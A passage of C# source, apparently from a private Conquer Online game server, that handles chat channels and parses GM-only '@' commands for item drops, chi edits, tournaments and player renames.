                        if (DateTime.Now > client.ChatBanTime.AddMinutes(client.ChatBanLasts))
                            client.ChatBanned = false;
                        else
                        {
                            int minutes = (int)new TimeSpan((client.ChatBanTime.AddMinutes(client.ChatBanLasts) - DateTime.Now).Ticks).TotalMinutes;
                            client.Send(new Message("You are banned from chat. You have to wait: " + minutes + " minutes before you can speak again!", System.Drawing.Color.Green, Message.Talk));
                            return;
                        }
                }
                //client.Entity.KillCount /= 2;
                if (message.ChatType == 2013)
                    message.ChatType = Message.Talk;
                switch (message.ChatType)
                {
                    case Message.CS:
                        {
                            if (client.Inventory.Contains(3002218, 1))
                            {
                                client.Inventory.Remove(3002218, 1);
                                client.SendScreen(message, true);
                            }
                            break;

                        }
                    case Message.HawkMessage:
                        {
                            if (client.Booth != null)
                            {
                                client.Booth.HawkMessage = message;
                                client.SendScreen(message, true);
                            }
                            break;
                        }
                    case Message.Talk:
                        {
                            client.SendScreen(message, false);
                            break;
                        }
                    case Message.Whisper:
                        {
                            foreach (Client.GameState pClient in Program.Values)
                            {
                                if (pClient.Entity.Name == message._To)
                                {
                                    if (client.Account.State == Database.AccountTable.AccountState.GM ||
                                       pClient.Account.State == Database.AccountTable.AccountState.GM)
                                    {
                                        if (client.ChatBlock)
                                        {
                                            client.MessageBox("ChatBlock is Active , Please Remove it");
                                            return;
                                        }
                                        if (pClient.ChatBlock)
                                        {
                                            client.MessageBox("ChatBlock is Active , You Can't Talk to Him.");
                                            return;
                                        }
                                    }
                                    DateTime dt;
                                    string date;
                                    string datess;
                                    if (pClient.Entity.BlackList.Contains(client.Entity.Name)) return;
                                    message.Mesh = client.Entity.Mesh;
                                    pClient.Send(message);

                                    if (client.Account.State == Database.AccountTable.AccountState.GM ||
                                        client.Account.State == Database.AccountTable.AccountState.GM)
                                    {
                                        dt = DateTime.Now;
                                        date = string.Concat(new object[] { dt.Year, "-", dt.Month, "\\" });
                                        datess = dt.Day + "\\";
                                        if (!Directory.Exists("gmlogs\\"))
                                        {
                                            Directory.CreateDirectory("gmlogs\\");
                                        }
                                        if (!Directory.Exists("gmlogs\\msglogs"))
                                        {
                                            Directory.CreateDirectory("gmlogs\\msglogs");
                                        }
                                        if (!Directory.Exists("gmlogs\\msglogs\\" + date))
                                        {
                                            Directory.CreateDirectory("gmlogs\\msglogs\\" + date);
                                        }
                                        if (!File.Exists(string.Concat(new object[] { "gmlogs\\msglogs\\" + date + "\\" + dt.Day + ".txt" })))
                                        {
                                            using (System.IO.FileStream fs = System.IO.File.Create("gmlogs\\msglogs\\" + date + "\\" + dt.Day + ".txt"))
                                            {
                                                fs.Close();
                                            }
                                        }
                                        using (System.IO.StreamWriter file = new System.IO.StreamWriter("gmlogs\\msglogs\\" + date + "\\" + dt.Day + ".txt", true))
                                        {
                                            file.WriteLine(client.Entity.Name + " Talk to : [" + pClient.Entity.Name + "] Message: [" + message.__Message + "]");
                                        }
                                    }
                                    return;
                                }
                            }
                            foreach (Game.ConquerStructures.Society.Friend friend in client.Friends.Values)
                            {
                                if (friend.Name == message._To)
                                {
                                    message.__Message = message.__Message.Replace("'", "¹");
                                    client.OnMessageBoxEventParams = new object[3];
                                    client.OnMessageBoxEventParams[0] = client.Entity.UID;
                                    client.OnMessageBoxEventParams[1] = friend.ID;

                                    client.MessageOK =
                                        delegate
                                        {
                                            Database.KnownPersons.UpdateMessageOnFriend(Convert.ToUInt32(client.OnMessageBoxEventParams[0]), Convert.ToUInt32(client.OnMessageBoxEventParams[1]), Convert.ToString(client.OnMessageBoxEventParams[2]));
                                            client.Send(new Message("Message sent!", System.Drawing.Color.Green, Message.TopLeft));
                                        };
                                    client.MessageCancel =
                                        delegate
                                        {
                                            client.OnMessageBoxEventParams = new object[0];
                                        };
                                    client.Send(new NpcReply(NpcReply.MessageBox, "To " + friend.Name + ": \r\n" + message.__Message + "\r\n\r\nSend? (It will replace other messages.)"));
                                    return;
                                }
                            }
                            client.Send(new Message("The player is not online.", System.Drawing.Color.Orange, Message.Service));
                            break;
                        }
                    case Message.Service:
                        {
                            foreach (Client.GameState pClient in Program.Values)
                            {
                                if (pClient.Account.State == Database.AccountTable.AccountState.GM || pClient.Account.State == Database.AccountTable.AccountState.GM)
                                {
                                    message.ChatType = Message.Talk;
                                    string _Message = "Service-> " + client.Entity.Name + " needs your help. Respond to him/her right now!!!";
                                    message.__Message = _Message;
                                    pClient.Send(message);
                                    return;
                                }
                            }
                            break;
                        }
                    case Message.World:
                        {
                            if (client.Entity.Level >= 70 || client.Entity.Reborn != 0)
                            {
                                foreach (Client.GameState pClient in Program.Values)
                                {
                                    if (pClient.Entity.BlackList.Contains(client.Entity.Name)) continue;
                                    if (pClient.Entity.UID != client.Entity.UID)
                                        pClient.Send(message);
                                }
                            }
                            break;
                        }
                    case Message.Guild:
                        {
                            if (client.Guild != null)
                                client.Guild.SendGuildMessage(message);
                            break;
                        }
                    case Message.Team:
                        {
                            if (client.Team != null)
                            {
                                foreach (Client.GameState Client in client.Team.Teammates)
                                {
                                    if (Client.Entity.BlackList.Contains(client.Entity.Name)) continue;
                                    if (client.Entity.UID != Client.Entity.UID)
                                        Client.Send(message);
                                }
                            }
                            break;
                        }
                    case Message.Friend:
                        {
                            foreach (Game.ConquerStructures.Society.Friend friend in client.Friends.Values)
                            {
                                if (friend.IsOnline)
                                    friend.Client.Send(message);
                            }
                            break;
                        }
                    case Message.Ally:
                        {
                            if (client.Guild != null)
                            {
                                foreach (Game.ConquerStructures.Society.Guild guild in client.Guild.Ally.Values)
                                {
                                    guild.SendGuildMessage(message);
                                    client.Guild.SendGuildMessage(message);
                                }
                            }
                            break;
                        }
                    case (uint)MsgMessageBoard.Channel.MsgTrade:
                        {
                            Message.MessageBoard.MessageInfo Info =
                                Message.MessageBoard.GetMsgInfoByAuthor(client.Entity.Name, (ushort)message.ChatType);

                            Message.MessageBoard.Delete(Info, (ushort)message.ChatType);
                            Message.MessageBoard.Add(client.Entity.Name, message.__Message, (ushort)message.ChatType);
                            break;
                        }
                    case (uint)MsgMessageBoard.Channel.MsgFriend:
                        {
                            Message.MessageBoard.MessageInfo Info =
                                Message.MessageBoard.GetMsgInfoByAuthor(client.Entity.Name, (ushort)message.ChatType);

                            Message.MessageBoard.Delete(Info, (ushort)message.ChatType);
                            Message.MessageBoard.Add(client.Entity.Name, message.__Message, (ushort)message.ChatType);
                            break;
                        }
                    case (uint)MsgMessageBoard.Channel.MsgTeam:
                        {
                            Message.MessageBoard.MessageInfo Info =
                               Message.MessageBoard.GetMsgInfoByAuthor(client.Entity.Name, (ushort)message.ChatType);

                            Message.MessageBoard.Delete(Info, (ushort)message.ChatType);
                            Message.MessageBoard.Add(client.Entity.Name, message.__Message, (ushort)message.ChatType);
                            break;
                        }
                    case (uint)MsgMessageBoard.Channel.MsgSyn:
                        {
                            Message.MessageBoard.MessageInfo Info =
                              Message.MessageBoard.GetMsgInfoByAuthor(client.Entity.Name, (ushort)message.ChatType);

                            Message.MessageBoard.Delete(Info, (ushort)message.ChatType);
                            Message.MessageBoard.Add(client.Entity.Name, message.__Message, (ushort)message.ChatType);
                            break;
                        }
                    case (uint)MsgMessageBoard.Channel.MsgOther:
                        {
                            Message.MessageBoard.MessageInfo Info =
                              Message.MessageBoard.GetMsgInfoByAuthor(client.Entity.Name, (ushort)message.ChatType);

                            Message.MessageBoard.Delete(Info, (ushort)message.ChatType);
                            Message.MessageBoard.Add(client.Entity.Name, message.__Message, (ushort)message.ChatType);
                            break;
                        }
                    default:
                        {
                            client.SendScreen(message, false);
                            // client.SendScreen(message, !client.Entity.Dead);
                            break;
                        }

                }
            }
        }

        public static uint[] LoadEntityUIDs(int lim)
        {
            uint[] array = new uint[lim];
            string query = "select * from entities limit " + lim;
            using (var cmd = new Database.MySqlCommand(Database.MySqlCommandType.SELECT))
            {
                cmd.Command = query;
                using (var reader = new Database.MySqlReader(cmd))
                {
                    for (int i = 0; i < lim; i++)
                    {
                        reader.Read();
                        array[i] = reader.ReadUInt32("UID");
                    }
                }
            }
            return array;
        }
        public static void Cursed(uint UID, Client.GameState client)
        {
            client.Entity.Cursed = Time32.Now;
            Update update = new Update(true) { UID = client.Entity.UID };
            update.Append(Network.GamePackets.Update.CursedTimer, UID);
            client.Entity.AddFlag(Update.Flags.Cursed);
            client.Send(update.ToArray());
        }

        public static bool CheckCommand(string message, Client.GameState client, bool Ask = false)
        {
            if (Ask == true)
            {
                Npcs dialog = new Npcs(client);
                client.ActiveNpc = 5435234;
                dialog.Text("Input the password.");
                dialog.Input("Password:", 1, 16);
                dialog.Send();
                client.Command = message;
                return true;
            }
            try
            {
                if (message.StartsWith("@"))
                {
                    string message_ = message.Substring(1).ToLower();
                    string Mess = message.Substring(1);
                    string[] Data = message_.Split(' ');
                    #region GMs PMs
                    if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                    {
                        switch (Data[0])
                        {
                            default:
                                {
                                    return MTA.Client.Commands.GMCommands.CheckCommand(client, message);
                                }

                            case "chatblock":
                                {
                                    client.ChatBlock = !client.ChatBlock;
                                    break;
                                }
                            case "tradeblock":
                                {
                                    client.BlockTrade = !client.BlockTrade;
                                    break;
                                }
                            case "dropcps":
                                {

                                    ConquerItem Item = null;
                                    #region Get Item
                                    string ItemName = Data[1];
                                    string loweredName = ItemName.ToLower();
                                    bool SpecialItem = false;
                                    uint SpecialID = 0;
                                    if (ItemName.Contains("item") || ItemName.Contains("cp") || ItemName.Contains("met") || ItemName.Contains("db") || ItemName.Contains("stone") || ItemName.Contains("soul"))
                                    {
                                        if (ItemName.Contains("cp"))
                                            SpecialID = 729911;
                                        else if (ItemName.Contains("db"))
                                            SpecialID = 1088000;
                                        else if (ItemName.Contains("met"))
                                            SpecialID = 1088001;
                                        else if (ItemName.Contains("stone"))
                                            SpecialID = 730008;
                                        else if (ItemName.Contains("Soul"))
                                            SpecialID = 800110;
                                        else if (ItemName.Contains("item"))
                                            SpecialID = uint.Parse(Data[3]);
                                        SpecialItem = true; goto PrepareDrop;
                                    }
                                    if (ItemName.Contains("MrHeMaKing_CPS"))
                                        SpecialID = uint.Parse(Data[3]);
                                    if (loweredName == "exp")
                                    {
                                        foreach (Interfaces.IMapObject ClientObj in client.Screen.Objects)
                                        {
                                            if (ClientObj != null)
                                            {
                                                if (ClientObj is Game.Entity)
                                                {
                                                    if (ClientObj.MapObjType == MTA.Game.MapObjectType.Player)
                                                    {
                                                        ClientObj.Owner.IncreaseExperience(ClientObj.Owner.ExpBall, false);
                                                    }
                                                }
                                            }
                                        }
                                        break;
                                    }
                                    Game.Enums.ItemQuality Quality = Game.Enums.ItemQuality.NormalV3;
                                    if (Data.Length > 2)
                                    {
                                        switch (Data[3].ToLower())
                                        {
                                            case "fixed": Quality = Game.Enums.ItemQuality.Fixed; break;
                                            case "normal": Quality = Game.Enums.ItemQuality.Normal; break;
                                            case "normalv1": Quality = Game.Enums.ItemQuality.NormalV1; break;
                                            case "normalv2": Quality = Game.Enums.ItemQuality.NormalV2; break;
                                            case "normalv3": Quality = Game.Enums.ItemQuality.NormalV3; break;
                                            case "refined": Quality = Game.Enums.ItemQuality.Refined; break;
                                            case "unique": Quality = Game.Enums.ItemQuality.Unique; break;
                                            case "elite": Quality = Game.Enums.ItemQuality.Elite; break;
                                            case "super": Quality = Game.Enums.ItemQuality.Super; break;
                                            case "other": Quality = Game.Enums.ItemQuality.Other; break;
                                            default:
                                                {
                                                    Quality = (MTA.Game.Enums.ItemQuality)int.Parse(Data[4]);
                                                    break;
                                                }
                                        }
                                    }
                                    Database.ConquerItemBaseInformation CIBI = null;
                                    foreach (Database.ConquerItemBaseInformation infos in Database.ConquerItemInformation.BaseInformations.Values)
                                    {
                                        if (infos.LowerName == loweredName && Quality == (Game.Enums.ItemQuality)(infos.ID % 10))
                                        {
                                            CIBI = infos;
                                        }
                                        else
                                        {
                                            if (infos.LowerName == loweredName)
                                                CIBI = infos;
                                        }
                                    }
                                    if (CIBI == null)
                                        break;
                                    Item = new GamePackets.ConquerItem(true);
                                    Item.ID = CIBI.ID;
                                    Item.Durability = CIBI.Durability;
                                    Item.MaximDurability = CIBI.Durability;
                                    if (Data.Length > 3)
                                        Item.Plus = byte.Parse(Data[4]);
                                    #endregion
                                    PrepareDrop:
                                    {
                                        if (Item != null || SpecialItem)
                                        {
                                            //dropevent Name Quality
                                            for (int i = 0; i < int.Parse(Data[2]); i++)
                                            {
                                                #region GetCoords (X, Y)
                                                ushort X = 0;
                                                ushort Y = 0;
                                            getCoords:
                                                {
                                                    X = (ushort)Kernel.Random.Next(client.Entity.X - 20, client.Entity.X + 20);
                                                    Y = (ushort)Kernel.Random.Next(client.Entity.Y - 20, client.Entity.Y + 20);
                                                }
                                                while (!client.Map.SelectCoordonates(ref X, ref Y))
                                                    goto getCoords;
                                                #endregion
                                                #region Drop Floor Item
                                                FloorItem floorItem = new FloorItem(true);
                                                if (SpecialItem)
                                                {
                                                    if (SpecialID == 729911)
                                                    {
                                                        floorItem.ValueType = Network.GamePackets.FloorItem.FloorValueType.ConquerPoints;
                                                        floorItem.Value = 50;
                                                    }
                                                    if (ItemName.Contains("MrHeMaKing_CPS"))
                                                    {
                                                        floorItem.ValueType = Network.GamePackets.FloorItem.FloorValueType.ConquerPoints;
                                                        floorItem.Value = uint.Parse(Data[4]);
                                                    }
                                                    floorItem.ItemID = SpecialID;
                                                    floorItem.Item = new ConquerItem(true);
                                                    floorItem.Item.ID = SpecialID;
                                                    floorItem.Item.UID = FloorItem.FloorUID.Next;
                                                    floorItem.UID = floorItem.Item.UID;
                                                    floorItem.Item.MobDropped = true;
                                                    while (client.Map.Npcs.ContainsKey(floorItem.Item.UID))
                                                    {
                                                        floorItem.Item.UID = FloorItem.FloorUID.Next;
                                                        floorItem.UID = FloorItem.FloorUID.Next;
                                                    }

                                                }
                                                else
                                                {
                                                    floorItem.Item = new ConquerItem(true);
                                                    floorItem.Item.Color = Item.Color;
                                                    floorItem.Item.Durability = Item.Durability;
                                                    floorItem.Item.ID = Item.ID;
                                                    floorItem.Item.Mode = Game.Enums.ItemMode.Default;
                                                    floorItem.Item.UID = FloorItem.FloorUID.Next;
                                                    floorItem.UID = floorItem.Item.UID;
                                                    floorItem.Item.MobDropped = true;
                                                    floorItem.ItemColor = Item.Color;
                                                    floorItem.ItemID = Item.ID;
                                                    while (client.Map.Npcs.ContainsKey(floorItem.Item.UID))
                                                    {
                                                        floorItem.Item.UID = FloorItem.FloorUID.Next;
                                                        floorItem.UID = FloorItem.FloorUID.Next;
                                                    }
                                                }

                                                floorItem.MapID = client.Map.ID;
                                                floorItem.MapObjType = Game.MapObjectType.Item;
                                                floorItem.X = X;
                                                floorItem.Y = Y;
                                                floorItem.Type = FloorItem.Drop;
                                                floorItem.OnFloor = Time32.Now;
                                                client.SendScreenSpawn(floorItem, true);
                                                client.Map.AddFloorItem(floorItem);
                                            }
                                        }
                                        #endregion
                                    }
                                    break;
                                }
                            case "statue":
                                {
                                    Game.Statue statue = new Statue(client.Entity.SpawnPacket);
                                    client.Send(statue.SpawnPacket);
                                    break;
                                }
                            case "team":
                                {
                                    Game.Features.Tournaments.TeamElitePk.TeamTournament.Open();
                                    foreach (var clien in Kernel.GamePool.Values)
                                    {
                                        if (clien.Team == null)
                                            clien.Team = new Game.ConquerStructures.Team(clien);
                                        Game.Features.Tournaments.TeamElitePk.TeamTournament.Join(clien, 3);
                                    }
                                    break;
                                }
                            case "steam":
                                {
                                    Game.Features.Tournaments.TeamElitePk.SkillTeamTournament.Open();
                                    foreach (var clien in Kernel.GamePool.Values)
                                    {
                                        if (clien.Team == null)
                                            clien.Team = new Game.ConquerStructures.Team(clien);
                                        Game.Features.Tournaments.TeamElitePk.SkillTeamTournament.Join(clien, 3);
                                    }
                                    break;
                                }
                            case "checkname":
                                {
                                    foreach (var px in Program.Values)
                                    {
                                        if ((px.Entity.Name == "") || (px.Entity.Name == " "))
                                        {
                                            string name = px.NewName = "ChangeName:" + Kernel.Random.Next(int.MaxValue);
                                            if (name.Length > 16)
                                                name = px.NewName = name.Substring(0, 16);
                                            px.OnDisconnect = p =>
                                            {
                                                #region ChangeName progress
                                                string name200 = p.Entity.Name;
                                                string newname = p.NewName;
                                                uint uid = p.Entity.UID;
                                                if (newname != "")
                                                {
                                                    MTA.Console.WriteLine("Change Name In Progress");
                                                    if (newname != "")
                                                    {
                                                        Database.MySqlCommand cmdupdate = null;
                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("apprentice").Set("MentorName", newname).Where("MentorID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("apprentice").Set("ApprenticeName", newname).Where("ApprenticeID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("arena").Set("EntityName", newname).Where("EntityID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("claimitems").Set("OwnerName", newname).Where("OwnerUID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("claimitems").Set("GainerName", newname).Where("GainerUID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("detaineditems").Set("OwnerName", newname).Where("OwnerUID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("detaineditems").Set("GainerName", newname).Where("GainerUID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("enemy").Set("EnemyName", newname).Where("EnemyID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("friends").Set("FriendName", newname).Where("FriendID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("guilds").Set("Name", newname).Where("Name", name).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("guilds").Set("LeaderName", newname).Where("LeaderName", name).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("nobility").Set("EntityName", newname).Where("EntityUID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("partners").Set("PartnerName", newname).Where("PartnerID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("chi").Set("name", newname).Where("uid", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("teamarena").Set("EntityName", newname).Where("EntityID", uid).Execute();

                                                        cmdupdate = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE);
                                                        cmdupdate.Update("entities").Set("name", newname).Set("namechange", "").Where("UID", uid).Execute();
                                                        Console.WriteLine(" -[" + name + "] : -[" + newname + "]");


                                                        if (Game.ConquerStructures.Nobility.Board.ContainsKey(p.Entity.UID))
                                                        {
                                                            Game.ConquerStructures.Nobility.Board[p.Entity.UID].Name = p.NewName;
                                                        }
                                                        if (Arena.ArenaStatistics.ContainsKey(p.Entity.UID))
                                                        {
                                                            Arena.ArenaStatistics[p.Entity.UID].Name = p.NewName;
                                                        }

                                                        if (p.Guild != null)
                                                        {
                                                            if (p.Guild.LeaderName == name200)
                                                            {
                                                                Kernel.Guilds[p.Guild.ID].LeaderName = p.NewName;
                                                                Kernel.Guilds[p.Guild.ID].Members[p.Entity.UID].Name = p.NewName;
                                                            }
                                                        }

                                                    }
                                                }
                                                #endregion ChangeName progressa
                                            };
                                            px.Disconnect();
                                        }
                                    }
                                    break;
                                }
                            case "inboxx":
                                {
                                    byte[] test = new byte[12 + 8];
                                    Writer.WriteUshort((ushort)(test.Length - 8), 0, test);
                                    Writer.WriteUshort(1047, 2, test);
                                    Writer.Byte(3, 4, test);
                                    client.Send(test);
                                    break;
                                }
                            case "portal":
                                {
                                    foreach (var p in client.Map.portals)
                                    {
                                        Console.WriteLine(string.Format("{0} : {1}", p.XCord.ToString(), p.YCord.ToString()));
                                    }
                                    break;
                                }
                            #region Franko Chi
                            case "matrixchi":
                                {
                                    var Mode = int.Parse(Data[1]);
                                    var pos = (int)(int.Parse(Data[2]) - 1);
                                    var powers = client.ChiPowers[Mode - 1];
                                    var attributes = powers.Attributes;
                                    attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[3]);
                                    attributes[pos].Value = (ushort)(Game.Enums.ChiMaxValues(attributes[pos].Type) - ushort.Parse(Data[4]));
                                    powers.CalculatePoints();
                                    Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                    powers.Power = (Enums.ChiPowerType)Mode;
                                    client.Send(new ChiPowers(true).Query(client));
                                    #region update ranking
                                    Database.ChiTable.ChiData[] array = null;
                                    switch ((Enums.ChiPowerType)Mode)
                                    {
                                        case Game.Enums.ChiPowerType.Dragon:
                                            array = Database.ChiTable.Dragon;
                                            break;

                                        case Game.Enums.ChiPowerType.Phoenix:
                                            array = Database.ChiTable.Phoenix;
                                            break;

                                        case Game.Enums.ChiPowerType.Tiger:
                                            array = Database.ChiTable.Tiger;
                                            break;

                                        case Game.Enums.ChiPowerType.Turtle:
                                            array = Database.ChiTable.Turtle;
                                            break;
                                    }
                                    foreach (var chiData in array)
                                    {
                                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                                        {
                                            var pClient = Kernel.GamePool[chiData.UID];
                                            if (pClient == null) continue;
                                            if (pClient.ChiData == null) continue;
                                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                pClient.LoadItemStats();
                                        }
                                    }
                                    #endregion
                                    Database.ChiTable.Save(client);
                                }
                                break;
                            case "matrixchi2":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            var Mode = int.Parse(Data[2]);
                                            var pos = (int)(int.Parse(Data[3]) - 1);
                                            var powers = Client.ChiPowers[Mode - 1];
                                            var attributes = powers.Attributes;
                                            attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[4]);
                                            attributes[pos].Value = (ushort)(Game.Enums.ChiMaxValues(attributes[pos].Type) - ushort.Parse(Data[5]));
                                            powers.CalculatePoints();
                                            Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                            powers.Power = (Enums.ChiPowerType)Mode;
                                            Client.Send(new ChiPowers(true).Query(Client));
                                            #region update ranking
                                            Database.ChiTable.ChiData[] array = null;
                                            switch ((Enums.ChiPowerType)Mode)
                                            {
                                                case Game.Enums.ChiPowerType.Dragon:
                                                    array = Database.ChiTable.Dragon;
                                                    break;

                                                case Game.Enums.ChiPowerType.Phoenix:
                                                    array = Database.ChiTable.Phoenix;
                                                    break;

                                                case Game.Enums.ChiPowerType.Tiger:
                                                    array = Database.ChiTable.Tiger;
                                                    break;

                                                case Game.Enums.ChiPowerType.Turtle:
                                                    array = Database.ChiTable.Turtle;
                                                    break;
                                            }
                                            foreach (var chiData in array)
                                            {
                                                if (Kernel.GamePool.ContainsKey(chiData.UID))
                                                {
                                                    var pClient = Kernel.GamePool[chiData.UID];
                                                    if (pClient == null) continue;
                                                    if (pClient.ChiData == null) continue;
                                                    SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                                    if (pClient.Entity.UID == Client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                        pClient.LoadItemStats();
                                                }
                                            }
                                            #endregion
                                            Database.ChiTable.Save(Client);
                                        }
                                    }
                                }
                                break;
                            #endregion
                            #region Franko Chi2
                            case "matrixchi3":
                                {
                                    var Mode = int.Parse(Data[1]);
                                    var pos = (int)(int.Parse(Data[2]) - 1);
                                    var powers = client.ChiPowers[Mode - 1];
                                    var attributes = powers.Attributes;
                                    attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[3]);
                                    attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
                                    powers.CalculatePoints();
                                    Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                    powers.Power = (Enums.ChiPowerType)Mode;
                                    client.Send(new ChiPowers(true).Query(client));
                                    #region update ranking
                                    Database.ChiTable.ChiData[] array = null;
                                    switch ((Enums.ChiPowerType)Mode)
                                    {
                                        case Game.Enums.ChiPowerType.Dragon:
                                            array = Database.ChiTable.Dragon;
                                            break;

                                        case Game.Enums.ChiPowerType.Phoenix:
                                            array = Database.ChiTable.Phoenix;
                                            break;

                                        case Game.Enums.ChiPowerType.Tiger:
                                            array = Database.ChiTable.Tiger;
                                            break;

                                        case Game.Enums.ChiPowerType.Turtle:
                                            array = Database.ChiTable.Turtle;
                                            break;
                                    }
                                    foreach (var chiData in array)
                                    {
                                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                                        {
                                            var pClient = Kernel.GamePool[chiData.UID];
                                            if (pClient == null) continue;
                                            if (pClient.ChiData == null) continue;
                                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                pClient.LoadItemStats();
                                        }
                                    }
                                    #endregion
                                    Database.ChiTable.Save(client);
                                }
                                break;
                            case "matrixchi4":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            var Mode = int.Parse(Data[2]);
                                            var pos = (int)(int.Parse(Data[3]) - 1);
                                            var powers = Client.ChiPowers[Mode - 1];
                                            var attributes = powers.Attributes;
                                            attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[4]);
                                            attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
                                            powers.CalculatePoints();
                                            Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                            powers.Power = (Enums.ChiPowerType)Mode;
                                            Client.Send(new ChiPowers(true).Query(Client));
                                            #region update ranking
                                            Database.ChiTable.ChiData[] array = null;
                                            switch ((Enums.ChiPowerType)Mode)
                                            {
                                                case Game.Enums.ChiPowerType.Dragon:
                                                    array = Database.ChiTable.Dragon;
                                                    break;

                                                case Game.Enums.ChiPowerType.Phoenix:
                                                    array = Database.ChiTable.Phoenix;
                                                    break;

                                                case Game.Enums.ChiPowerType.Tiger:
                                                    array = Database.ChiTable.Tiger;
                                                    break;

                                                case Game.Enums.ChiPowerType.Turtle:
                                                    array = Database.ChiTable.Turtle;
                                                    break;
                                            }
                                            foreach (var chiData in array)
                                            {
                                                if (Kernel.GamePool.ContainsKey(chiData.UID))
                                                {
                                                    var pClient = Kernel.GamePool[chiData.UID];
                                                    if (pClient == null) continue;
                                                    if (pClient.ChiData == null) continue;
                                                    SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                                    if (pClient.Entity.UID == Client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                        pClient.LoadItemStats();
                                                }
                                            }
                                            #endregion
                                            Database.ChiTable.Save(Client);
                                        }
                                    }
                                }
                                break;
                            #endregion
                            #region refinry
                            case "refinry":
                                {
                                    /* client.Inventory.Add(724352, 0, 1);
                                     client.Inventory.Add(724357, 0, 1);
                                     client.Inventory.Add(724362, 0, 1);
                                     client.Inventory.Add(724367, 0, 1);
                                     client.Inventory.Add(724372, 0, 1);
                                     client.Inventory.Add(724377, 0, 1);
                                     client.Inventory.Add(724384, 0, 1);
                                     client.Inventory.Add(724389, 0, 1);
                                     client.Inventory.Add(724394, 0, 1);

                                     client.Inventory.Add(724404, 0, 1);
                                     client.Inventory.Add(724409, 0, 1);
                                     client.Inventory.Add(724414, 0, 1);
                                     client.Inventory.Add(724419, 0, 1);

                                     client.Inventory.Add(724424, 0, 1);
                                     client.Inventory.Add(724429, 0, 1);
                                     client.Inventory.Add(724434, 0, 1);
                                     client.Inventory.Add(724439, 0, 1);
                                     client.Inventory.Add(724444, 0, 1);

                                     client.Inventory.Add(724453, 0, 1);
                                     client.Inventory.Add(724458, 0, 1);
                                     client.Inventory.Add(724463, 0, 1);
                                     client.Inventory.Add(724472, 0, 1);
                                     client.Inventory.Add(724477, 0, 1);
                                     client.Inventory.Add(724482, 0, 1);


                                     client.Inventory.Add(724487, 0, 1);
                                     client.Inventory.Add(724492, 0, 1);
                                     client.Inventory.Add(724497, 0, 1);
                                     client.Inventory.Add(724502, 0, 1);*/
                                    foreach (var item in Kernel.DatabaseRefinery.Values)
